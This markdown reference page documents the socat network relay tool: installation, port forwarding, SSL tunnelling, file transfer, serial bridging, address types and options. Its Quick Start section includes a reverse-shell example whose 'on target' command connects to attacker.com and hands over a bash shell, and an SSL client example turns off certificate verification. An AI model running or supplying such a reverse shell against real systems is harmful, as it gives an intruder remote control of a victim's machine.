---
title: "socat"
category: "tool"
tags: ["networking", "relay", "proxy", "tunnel", "ssl", "serial"]
sources:
  - type: manpage
    url: "https://man7.org/linux/man-pages/man1/socat.1.html"
  - type: official
    url: "http://www.dest-unreach.org/socat/"
last_updated: "2025-12-27"
---

# socat

Multipurpose relay for bidirectional data transfer (SOcket CAT).

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Documentation Files](#documentation-files)

## Overview

Socat establishes two bidirectional byte streams and transfers data between them. It supports a wide variety of address types including TCP, UDP, UNIX sockets, SSL/TLS, PTY, EXEC, files, and more. This makes it extremely versatile for:

- Port forwarding and proxying
- SSL/TLS tunneling
- Serial port communication
- Reverse shells and listeners
- Network debugging and testing
- VPN-like tunnels with TUN/TAP

### Basic Syntax

```bash
socat [options] <address1> <address2>
```

Data flows bidirectionally between address1 and address2.

## Installation

```bash
# Debian/Ubuntu
apt install socat

# RHEL/CentOS/Fedora
dnf install socat

# macOS
brew install socat
```

## Quick Start

### TCP Port Forwarding

```bash
# Forward local port 8080 to remote server
socat TCP-LISTEN:8080,fork TCP:remote.host:80
```

### Simple Reverse Shell

```bash
# Listener
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid

# Client (on target)
socat TCP:attacker.com:4444 EXEC:/bin/bash,pty,stderr,setsid
```

### SSL Tunnel

```bash
# SSL client
socat - OPENSSL:server:443,verify=0

# SSL server
socat OPENSSL-LISTEN:443,cert=server.pem,fork EXEC:/bin/cat
```

### File Transfer

```bash
# Sender                                      # Receiver
socat TCP-LISTEN:9999 FILE:myfile.txt         socat TCP:sender:9999 FILE:received.txt,create
```

### Other Common Uses

```bash
# Serial port to TCP
socat TCP-LISTEN:5555,fork /dev/ttyUSB0,b9600,raw

# SOCKS proxy tunnel
socat TCP-LISTEN:1234,fork SOCKS4:proxy.local:target.com:22
```

## Documentation Files

| File | Description |
|------|-------------|
| [options.md](options.md) | Command-line options, logging, environment variables |
| [address_types.md](address_types.md) | All address types (TCP, UDP, UNIX, SSL, EXEC, etc.) |
| [examples.md](examples.md) | Practical usage examples for common scenarios |
| [techniques.md](techniques.md) | Advanced address options and option groups |

## Key Concepts

### Address Format

```
TYPE:param1:param2,option1,option2=value
```

- **TYPE**: Address type keyword (TCP, UDP, EXEC, etc.)
- **params**: Required parameters (host, port, filename)
- **options**: Optional modifiers (fork, reuseaddr, pty)

### Common Address Types

| Type | Description |
|------|-------------|
| `TCP:<host>:<port>` | TCP client connection |
| `TCP-LISTEN:<port>` | TCP server listener |
| `UDP:<host>:<port>` | UDP communication |
| `EXEC:<command>` | Execute program |
| `OPENSSL:<host>:<port>` | SSL/TLS client |
| `PTY` | Pseudo-terminal |
| `STDIO` or `-` | Standard input/output |

### Essential Options

| Option | Description |
|--------|-------------|
| `fork` | Handle multiple connections (one child per connection) |
| `reuseaddr` | Allow immediate address reuse |
| `pty` | Use pseudo-terminal for EXEC |
| `stderr` | Redirect stderr to stdout |
| `bind=<addr>` | Bind to specific address |

### Debug Levels

```bash
socat -d     # Notice messages
socat -dd    # + Warning messages
socat -ddd   # + Info messages
socat -dddd  # + Debug messages
```

## See Also

- `nc(1)` - netcat
- `stunnel(8)` - SSL tunneling
- `ssh(1)` - OpenSSH client
